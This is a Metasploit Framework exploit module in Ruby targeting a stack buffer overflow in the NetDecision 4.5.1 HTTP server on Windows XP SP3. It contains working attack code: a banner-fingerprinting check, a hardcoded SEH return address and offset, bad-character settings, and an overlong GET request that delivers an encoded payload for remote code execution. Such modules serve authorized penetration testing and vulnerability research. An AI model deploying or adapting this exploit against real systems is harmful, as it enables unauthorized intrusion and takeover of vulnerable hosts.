# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
    include Msf::Exploit::Remote::HttpClient
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "NetDecision 4.5.1 HTTP Server Buffer Overflow",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in NetDecision&#039;s HTTP service
                (located in C:\Program Files\NetDecision\Bin\HttpSvr.exe).  By supplying a
                long string of data to the URL, an overflow may occur if the data gets handled
                by HTTP Server&#039;s active window.  In other words, in order to gain remote code
                execution, the victim is probably looking at HttpSvr&#039;s window.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Prabhu S Angadi&#039;,  #Discovery, DoS PoC
                    &#039;sinn3r&#039;            #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;OSVDB&#039;, &#039;79651&#039;],
                    [&#039;URL&#039;, &#039;http://secunia.com/advisories/48168/&#039;],
                    [&#039;URL&#039;, &#039;http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_Vuln.txt&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00\x09\x0a\x0d\x20\x25\x26\x27\x3f",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => "seh",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;NetDecision 4.5.1 on XP SP3&#039;,
                        {
                            # POP/POP/RET - OLEACC.dll
                            &#039;Ret&#039;    => 0x74C869E2,
                            &#039;Offset&#039; => 1620
                        }
                    ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Feb 24 2012",
            &#039;DefaultTarget&#039;  => 0))
    end
    def check
        res = send_request_cgi({&#039;uri&#039;=>&#039;/&#039;})
        banner = res.headers[&#039;Server&#039;]
        if banner =~ /NetDecision\-HTTP\-Server\/1\.0/
            return Exploit::CheckCode::Vulnerable
        else
            return Exploit::CheckCode::Safe
        end
    end
    def exploit
        buf = "/"
        buf << rand_text_alpha(675, payload_badchars)
        buf << pattern_create(5) #Avoid TerminateProcess()
        buf << rand_text_alpha(target[&#039;Offset&#039;]-buf.length, payload_badchars)
        buf << "\xeb\x06" + rand_text_alpha(2, payload_badchars)
        buf << [target.ret].pack(&#039;V*&#039;)
        buf << payload.encoded
        buf << rand_text_alpha(8000-buf.length, payload_badchars)
        print_status("#{rhost}:#{rport} - Sending #{self.name}...")
        send_request_raw({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => buf
        })
        handler
    end
end



